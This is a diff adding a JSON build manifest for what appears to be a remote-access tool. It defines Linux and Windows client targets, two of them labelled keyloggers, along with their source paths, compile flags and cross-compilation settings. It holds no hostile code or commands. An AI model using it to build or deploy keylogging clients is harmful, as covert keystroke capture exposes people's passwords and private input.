@@ -1,0 +1,34 @@
+{
+    "linux/privileged": {
+        "type": "Linux With Keylogger",
+        "description": "requires root",
+        "code_path": "linux/privileged/client.go",
+        "flags": "-trimpath -ldflags",
+        "environment": "",
+        "file_suffix": ""
+    },
+    "linux/unprivileged": {
+        "type": "Linux Original",
+        "description": "linux unprivileged",
+        "code_path": "linux/unprivileged/client.go",
+        "flags": "-trimpath -ldflags",
+        "environment": "",
+        "file_suffix": ""
+    },
+    "windows/unprivileged": {
+        "type": "Windows Original",
+        "description": "windows unprivileged",
+        "code_path": "windows/unprivileged/client.go",
+        "flags": "-trimpath -ldflags",
+        "environment": "GOOS=windows GOARCH=amd64",
+        "file_suffix": ".exe"
+    },
+    "windows/privileged": {
+        "type": "Windows Keylogger",
+        "description": "windows keylogger",
+        "code_path": "windows/privileged/client.go",
+        "flags": "-trimpath -ldflags",
+        "environment": "GOOS=windows GOARCH=amd64",
+        "file_suffix": ".exe"
+    }
+}
